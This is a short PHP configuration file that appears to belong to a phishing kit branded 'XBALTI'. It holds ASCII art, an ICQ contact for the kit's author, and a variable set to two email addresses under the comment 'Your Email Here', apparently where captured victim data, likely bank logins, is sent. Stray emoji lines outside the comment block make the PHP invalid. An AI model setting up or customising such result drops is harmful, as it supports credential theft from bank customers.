<?php


/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY ICQ@716199390 /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                     
*/

$XBALTI_EMAIL = "wowlooking4@gmail.com,resultsbanks@aol.com"; // Your Email Here :) icq : 716199390

  😈 Contact me if u want to edit or request some other information

  😈 icq : 716199390

?>

